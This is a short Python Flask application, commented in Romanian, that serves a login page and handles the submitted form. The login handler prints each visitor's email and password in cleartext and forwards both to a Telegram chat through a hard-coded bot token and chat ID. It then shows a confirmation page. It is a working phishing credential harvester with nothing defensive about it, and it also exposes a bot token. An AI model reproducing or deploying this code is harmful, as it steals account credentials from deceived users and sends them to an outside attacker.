from flask import Flask, request, render_template
import requests

app = Flask(__name__)

# ===== CONFIG TELEGRAM =====
BOT_TOKEN = "8366831885:AAGfZsn87eCTgMLNDJ19q9oGg-kuMyFtEnA"
CHAT_ID = "5937157896"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, data=data)


# ===== PAGINA LOGIN =====
@app.route("/", methods=["GET"])
def index():
    return render_template("login.html")


# ===== PROCESARE LOGIN =====
@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email")
    password = request.form.get("password")

    print("—— Login primit ——")
    print("Email:", email)
    print("Parola:", password)

    # 🔥 Trimite mesaj în TELEGRAM
    msg = f"🔐 LOGIN NOU\nEmail: {email}\nParola: {password}"
    send_to_telegram(msg)

    # Afișează pagina de confirmare
    return render_template("confirmare.html")


# ===== START SERVER =====
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
